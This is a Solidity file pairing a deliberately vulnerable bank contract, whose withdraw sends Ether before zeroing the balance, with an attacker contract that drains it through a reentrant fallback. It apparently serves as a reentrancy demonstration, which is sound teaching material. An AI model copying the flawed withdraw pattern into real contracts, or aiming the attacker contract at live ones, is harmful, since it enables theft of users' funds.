pragma solidity ^0.8.15;

contract BankRE {
  mapping(address => uint256) public balances;

  function deposit() public payable {
    balances[msg.sender] += msg.value;}

  function withdraw() public {
    require(balances[msg.sender] != 0);
    (bool result, ) = msg.sender.call{value: balances[msg.sender]}("");
    balances[msg.sender] = 0; }}

contract AttackRE {

    BankRE public bankRE;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _bankREAdress) {
        bankRE = BankRE(_bankREAdress);
    }

    fallback() external payable {
        if (address(bankRE).balance >= AMOUNT) {
            bankRE.withdraw();
        }
    }
    function attack() external payable {
        require(msg.value >= AMOUNT);
        bankRE.deposit{value: AMOUNT}();
        bankRE.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}